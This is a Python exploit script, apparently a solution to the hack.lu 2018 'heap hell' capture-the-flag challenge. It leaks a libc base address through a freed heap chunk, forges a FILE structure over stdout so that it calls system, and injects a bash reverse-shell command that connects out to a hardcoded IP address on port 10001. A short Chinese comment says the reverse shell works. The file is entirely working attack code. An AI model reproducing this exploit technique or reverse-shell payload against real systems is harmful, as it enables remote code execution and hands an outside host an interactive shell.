from pwncli import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_36_hack_lu_2018_heap_hell')
libc = elf.libc
cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def write_heap(off, data, size=None):
    if size is None:
        size = len(data)
    sla("[4] : exit\n", "1")
    sla("How much do you want to write?\n", str(size))
    sla("At which offset?\n", str(off))
    s(data)


def free_heap(off):
    sla("[4] : exit\n", "2")
    sla("At which offset do you want to free?\n", str(off))

def view_heap(off):
    sla("[4] : exit\n", "3")
    sla("At which offset do you want to leak?\n", str(off))
    return rl()

mmap_addr = 0x10000
rls("Allocating your scratch pad")
sl(str(mmap_addr))


# leak addr
write_heap(0, flat_z({
    0: [0, 0x111],
    0x110: [
        0, 0x21,
        0, 0
    ] * 3
}))

free_heap(0x10)

m = view_heap(0x10)
libc_base = set_current_libc_base_and_log(u64_ex(m[:-1]), 0x3c4b78)

file_str = FileStructure()
file_str.vtable = libc.sym["_IO_2_1_stdout_"] + 0x10 + 0x20
file_str.chain = libc.sym['system']
file_str._lock = libc_base + 0x3c6780 # 这里指定一个lock地址即可

# 反弹shell可以成功
payload = b"/bin/bash -c \"bash -i > /dev/tcp/120.25.122.195/10001 0>&1 2>&1\"\x00".ljust(0x48, b"\x00")
payload += bytes(file_str)[0x48:]

write_heap(off=libc.sym._IO_2_1_stdout_ - mmap_addr, data=payload, size=mmap_addr + 0x10000 + 1)

io.shutdown("send")

ia()